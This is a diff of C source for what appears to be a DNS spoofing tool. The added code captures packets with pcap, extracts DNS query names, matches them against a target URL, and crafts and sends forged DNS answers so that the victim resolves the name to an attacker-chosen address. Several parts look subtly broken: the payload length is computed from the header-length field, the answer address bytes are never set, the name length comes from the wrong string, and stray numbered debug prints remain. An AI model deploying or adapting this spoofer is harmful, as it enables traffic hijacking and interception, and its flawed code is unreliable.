@@ -23,77 +23,147 @@
 
 #include "spoof.h"
 
-// Check all the headers in the Ethernet frame
+
 void pkt_callback(u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet) {
     u_int16_t type = handle_ethernet(args, pkthdr, packet);
-
     /* handle the IP packet */
     if(type == ETHERTYPE_IP) handle_IP(args, pkthdr, packet);
-
-    /* handle the ARP packet */
-    else if (type == ETHERTYPE_ARP) {}
-
-    /* handle reverse arp packet */
-    else if (type == ETHERTYPE_REVARP){}
 }
 
 
-// This function will parse the IP header and print out selected fields of interest
 void handle_IP (u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet) {
-    const struct my_ip* ip;
-    u_int length = pkthdr->len;
-    u_int hlen, off, version;
-    int len;
-
-    ip = (struct my_ip*) (packet + sizeof(struct ether_header));
-    length -= sizeof(struct ether_header);
-    len     = ntohs(ip->ip_len);
-    hlen    = IP_HL(ip);
-    version = IP_V(ip);
-
-    if (ip->ip_p == IPPROTO_UDP) handle_UDP(args, pkthdr, packet);
+    const struct iphdr* ip;
+    ip = (struct iphdr*) (packet + sizeof(struct ether_header));
+    /* handle the UDP packet */
+    if (ip->protocol == IPPROTO_UDP) handle_UDP(args, pkthdr, packet);
 }
 
 
 void handle_UDP (u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet) {
-    const struct sniff_udp *udp = 0;
-    const struct my_ip *ip;              	// The IP header
-    const char *payload;
+    struct udphdr *udp;
+    struct iphdr *ip;
+    struct dnsquery dns_query;
+    struct dnshdr *dns_hdr;
+
+    char* response_packet = NULL;
+
+    char request[100] = {0};
+    char response[2096] = {0};
 
     int size_ip;
     int size_udp;
     int size_payload;
+    uint16_t size_response_payload = 0;
 
-//    printf ("[ UDP Header ]\n");
-
-    ip = (struct my_ip*) (packet + SIZE_ETHERNET);
-    size_ip = IP_HL (ip) * 4;
+    ip = (struct iphdr*) (packet + SIZE_ETHERNET);
+    size_ip = ip->ihl * 4;
 
 
-    // define/compute udp header offset
-    udp = (struct sniff_udp*) (packet + SIZE_ETHERNET + size_ip);
+    udp = (struct udphdr*) (packet + SIZE_ETHERNET + size_ip);
     size_udp = 8;
 
-
-    printf ("[ UDP Header ]\n");
-    printf("    Src port: %d\n", ntohs(udp->uh_sport));
-    opts.device_port = ntohs(udp->uh_sport);
-    send_dns.udp.uh_dport = htons(opts.device_port);
-    printf("    Dst port: %d\n", ntohs(udp->uh_dport));
-
-
-    // define/compute tcp payload (segment) offset
-    payload = (u_char *) (packet + SIZE_ETHERNET + size_ip + size_udp);
-
     // compute tcp payload (segment) size
-    size_payload = ntohs(ip->ip_len) - (size_ip + size_udp);
-
+    size_payload = ntohs(ip->ihl) - (size_ip + size_udp);
+    response_packet = response + sizeof(struct ip) + sizeof(struct udphdr);
 
     // Print payload data, including binary translation
     if (size_payload > 0) {
-        opts.device_port = ntohs(udp->uh_sport);
-        send_dns.udp.uh_dport = htons( opts.device_port);
-        printf("Payload (%d bytes):\n", size_payload);
-        print_payload(payload, size_payload);
+        handle_DNS(args, pkthdr, packet, &dns_hdr, &dns_query);
+        handle_DNS_request(&dns_query, request);
+        if (!strcmp(request, opts.request_url)) {
+            opts.device_port = ntohs(udp->uh_sport);
+            printf("1111111111111111111111\n");
+            size_response_payload = set_payload(dns_hdr, response_packet);
+            printf("2222222222222222222222\n");
+            create_header(response_packet, size_response_payload);
+            printf("3333333333333333333333\n");
+            size_response_payload += (sizeof(struct ip) + sizeof(struct udphdr));
+            printf("4444444444444444444444\n");
+            send_dns_answer(response_packet, size_response_payload);
+            printf("5555555555555555555555\n");
+        }
     }
+}
+
+
+void handle_DNS (u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet, struct dnshdr **dns_hdr, struct dnsquery *dns_query) {
+    struct etherhdr *ether;
+    struct iphdr *ip;
+    struct udphdr *udp;
+    unsigned int ip_header_size;
+
+    /* ethernet header */
+    ether = (struct etherhdr*)(packet);
+
+    /* ip header */
+    ip = (struct iphdr*)(((char*) ether) + sizeof(struct etherhdr));
+    ip_header_size = ip->ihl*4;
+    udp = (struct udphdr *)(((char*) ip) + ip_header_size);
+
+    /* dns header */
+    *dns_hdr = (struct dnshdr*)(((char*) udp) + sizeof(struct udphdr));
+    dns_query->qname = ((char*) *dns_hdr) + sizeof(struct dnshdr);
+}
+
+
+void handle_DNS_request(struct dnsquery *dns_query, char *request) {
+    unsigned int i, j, k;
+    char *curr = dns_query->qname;
+    unsigned int size;
+
+    size = curr[0];
+
+    j=0;
+    i=1;
+    while(size > 0) {
+        for(k=0; k<size; k++) {
+            request[j++] = curr[i+k];
+        }
+        request[j++]='.';
+        i+=size;
+        size = curr[i++];
+    }
+    request[--j] = '\0';
+}
+
+
+uint16_t set_payload(struct dnshdr *dns_hdr, char* response_packet) {
+    unsigned int size = 0; /* response_packet size */
+    struct dnsquery *dns_query;
+    unsigned char ans[4];
+
+    dns_query = (struct dnsquery*)(((char*) dns_hdr) + sizeof(struct dnshdr));
+
+    //dns_hdr
+    memcpy(&response_packet[0], dns_hdr->id, 2); //id
+    memcpy(&response_packet[2], "\x81\x80", 2); //flags
+    memcpy(&response_packet[4], "\x00\x01", 2); //qdcount
+    memcpy(&response_packet[6], "\x00\x01", 2); //ancount
+    memcpy(&response_packet[8], "\x00\x00", 2); //nscount
+    memcpy(&response_packet[10], "\x00\x00", 2); //arcount
+
+    //dns_query
+    size = strlen(opts.spoofing_ip) + 2;// +1 for the size of the first string; +1 for the last '.'
+    memcpy(&response_packet[12], dns_query, size); //qname
+    size+=12;
+    memcpy(&response_packet[size], "\x00\x01", 2); //type
+    size+=2;
+    memcpy(&response_packet[size], "\x00\x01", 2); //class
+    size+=2;
+
+    //dns_response_packet
+    memcpy(&response_packet[size], "\xc0\x0c", 2); //pointer to qname
+    size+=2;
+    memcpy(&response_packet[size], "\x00\x01", 2); //type
+    size+=2;
+    memcpy(&response_packet[size], "\x00\x01", 2); //class
+    size+=2;
+    memcpy(&response_packet[size], "\x00\x00\x00\x22", 4); //ttl - 34s
+    size+=4;
+    memcpy(&response_packet[size], "\x00\x04", 2); //rdata length
+    size+=2;
+    memcpy(&response_packet[size], ans, 4); //rdata
+    size+=4;
+
+    return size;
 }
